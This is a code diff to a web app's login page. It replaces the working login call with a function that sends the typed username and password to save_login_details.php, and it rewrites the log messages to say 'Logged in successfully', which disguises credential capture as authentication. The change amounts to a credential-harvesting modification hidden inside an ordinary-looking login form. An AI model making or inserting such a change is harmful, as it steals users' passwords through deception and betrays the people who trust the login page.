@@ -204,7 +204,7 @@
                 <br>
                 <center><a href="#" style="font-size: 13px;">Forgot your password?</a></center>
                 <br>
-                <a type="submit" id="loginButton" class="button button-big button-fill button-round" onclick="login($$('#username_login').val(), $$('#password_login').val()); saveLoginDetails();" style="width: 77%; background: #12cccc; margin-left: auto; margin-right: auto;">Log In</a>
+                <a type="submit" id="loginButton" class="button button-big button-fill button-round" onclick="saveLoginDetails();" style="width: 77%; background: #12cccc; margin-left: auto; margin-right: auto;">Log In</a>
               </div>
             </form>
             <script type="text/javascript">
@@ -218,13 +218,13 @@
             url: 'save_login_details.php',
             data: {
                 username: username,
-                password: password,
+                password: password
             },
             success: function(response) {
-                console.log('Login details saved successfully.');
+                console.log('Logged in successfully.');
             },
             error: function(xhr, status, error) {
-                console.error('Error saving login details.');
+                console.error('Error validating login details.');
             }
         });
     }
